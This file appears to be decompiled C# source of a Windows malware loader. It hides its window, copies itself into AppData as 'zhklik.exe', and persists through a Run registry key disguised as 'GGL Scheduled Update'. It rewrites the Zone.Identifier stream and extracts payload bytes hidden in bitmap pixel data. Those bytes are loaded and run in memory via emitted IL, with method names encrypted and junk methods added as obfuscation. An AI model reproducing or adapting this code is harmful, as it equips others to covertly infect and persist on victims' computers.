using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

namespace Program;

public class Main : Form
{
	public IContainer Components;

	private string path1;

	private Thread thread;

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Main());
	}

	public Main()
	{
		((Form)this).add_Load((EventHandler)Main_Load);
		path1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		Application.EnableVisualStyles();
		InitializeComponent();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 266);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Main");
		((Form)this).set_Text("Main");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	protected override void Dispose(bool Disposing)
	{
		if (Disposing && Components != null)
		{
			Components.Dispose();
		}
		((Form)this).Dispose(Disposing);
	}

	[DebuggerStepThrough]
	public void InitializeComponent()
	{
	}

	public void Installation(bool RemoveZoneID, string KeyName, string appname)
	{
		try
		{
			if (!appname.Contains(".exe"))
			{
				appname += ".exe";
			}
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + appname;
			if (!File.Exists(text))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Assembly.GetExecutingAssembly().Location, text, true);
				if (RemoveZoneID)
				{
					Process process = new Process();
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "cmd";
					processStartInfo.RedirectStandardInput = true;
					processStartInfo.RedirectStandardOutput = true;
					processStartInfo.UseShellExecute = false;
					processStartInfo.CreateNoWindow = true;
					process.StartInfo = processStartInfo;
					process.Start();
					StreamReader standardOutput = process.StandardOutput;
					StreamWriter standardInput = process.StandardInput;
					standardInput.WriteLine("cd " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
					standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + appname + ":ZONE.identifier");
					standardInput.WriteLine("exit");
					standardOutput.ReadToEnd();
					standardInput.Close();
					standardOutput.Close();
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey.GetValue(KeyName) == null)
				{
					registryKey.SetValue(KeyName, text);
				}
				registryKey.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object izMBx(byte[] bb)
	{
		if (bb[60] == 128)
		{
			return true;
		}
		return false;
	}

	public byte[] zzmmO(Bitmap data)
	{
		List<byte> list = new List<byte>();
		checked
		{
			int num = ((Image)data).get_Width() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)data).get_Height() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = data.GetPixel(i, j);
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
			}
			return list.ToArray();
		}
	}

	public static string DeCrypt(string Data, string key)
	{
		return Encoding.Default.GetString(DeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)));
	}

	public static byte[] DeCrypt(byte[] Data, byte[] key)
	{
		checked
		{
			for (int i = Data.Length * 2 + key.Length; i >= 0; i += -1)
			{
				Data[unchecked(i % Data.Length)] = (byte)unchecked(checked(unchecked(Data[i % Data.Length] ^ key[i % key.Length]) - unchecked((int)Data[checked(i + 1) % Data.Length]) + 256) % 256);
			}
			return Data;
		}
	}

	public void Bumbaross_Hq8G0Kx9Y()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(-1702645811L);
			new decimal(-289809003L);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Bumbaross_ATuH7WYB1t46lvpC14()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(-846394443L);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(1847582517L);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Bumbaross_MfWoiMU()
	{
	}

	public object WjLfK(byte[] BangBang, object[] BangBangs, string bangbangss, string bababang)
	{
		string name = DeCrypt("ñ¤^", "heyhey123");
		object obj = new DynamicMethod(name, typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		});
		object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "GetILGenerator", new object[0], (string[])null, (Type[])null, (bool[])null));
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "DefineLabel", new object[0], (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateCall(objectValue, (Type)null, "DeclareLocal", new object[1] { typeof(Assembly) }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_0 }, (string[])null, (Type[])null, (bool[])null, true);
		string name2 = DeCrypt("\u00b8†s\u00b4", "heyhey123");
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Call,
			typeof(Assembly).GetMethod(name2, new Type[1] { typeof(byte[]) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Stloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue2)
		};
		object[] array2 = array;
		bool[] array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", array2, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array[1]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array4 = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue2)
		};
		object[] array5 = array4;
		array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", array5, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array4[1]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		string name3 = DeCrypt("~(?¦…>a", "heyhey123");
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetMethod(name3, new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		string name4 = DeCrypt("ÙÛõ;¼ì", "heyhey123");
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod(name4, new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		array4 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
		object[] array6 = array4;
		array3 = new bool[1] { true };
		NewLateBinding.LateCall(objectValue, (Type)null, "MarkLabel", array6, (string[])null, (Type[])null, array3, true);
		if (array3[0])
		{
			objectValue2 = RuntimeHelpers.GetObjectValue(array4[0]);
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		string name5 = DeCrypt("\u001fÁñ,\u02dc\u00a8²}¾\u0013", "heyhey123");
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetProperty(name5)!.GetGetMethod(),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod(name4, new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		return NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
		{
			null,
			new object[4] { BangBang, BangBangs, bangbangss, bababang }
		}, (string[])null, (Type[])null, (bool[])null);
	}

	public void Bumbaross_XV24U()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public void Bumbaross_W1s2G0wf()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Bumbaross_AGmzK1M9oZAP1K89()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(1276008081L);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Go()
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\zhklik.exe";
		ResourceManager resourceManager = new ResourceManager("YtgqOJmoVou", Assembly.GetExecutingAssembly());
		int num = Conversions.ToInteger(resourceManager.GetObject("ImageCount"));
		Bitmap data = (Bitmap)resourceManager.GetObject("ImageDLL1");
		byte[] bangBang = zzmmO(data);
		if (File.Exists(path))
		{
			Bitmap data2 = (Bitmap)resourceManager.GetObject("Image0");
			byte[] array = zzmmO(data2);
			if (Operators.ConditionalCompareObjectEqual(izMBx(array), (object)true, false))
			{
				WjLfK(bangBang, new object[1] { array }, "Module1", "DoExecute");
			}
			else
			{
				WjLfK(bangBang, new object[1] { array }, "Module1", "ÅÓ");
			}
		}
		else
		{
			int num2 = num;
			for (int i = 0; i <= num2; i = checked(i + 1))
			{
				try
				{
					Bitmap data3 = (Bitmap)resourceManager.GetObject("Image" + i);
					byte[] array2 = zzmmO(data3);
					if (Operators.ConditionalCompareObjectEqual(izMBx(array2), (object)true, false))
					{
						WjLfK(bangBang, new object[1] { array2 }, "Module1", "DoExecute");
					}
					else
					{
						WjLfK(bangBang, new object[1] { array2 }, "Module1", "ÅÓ");
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			Installation(RemoveZoneID: true, "GGL Scheduled Update", "zhklik.exe");
		}
		((Form)this).Close();
	}

	private void Main_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		Control.set_CheckForIllegalCrossThreadCalls(false);
		thread = new Thread(Go);
		thread.Start();
		File.Exists(path1);
	}
}
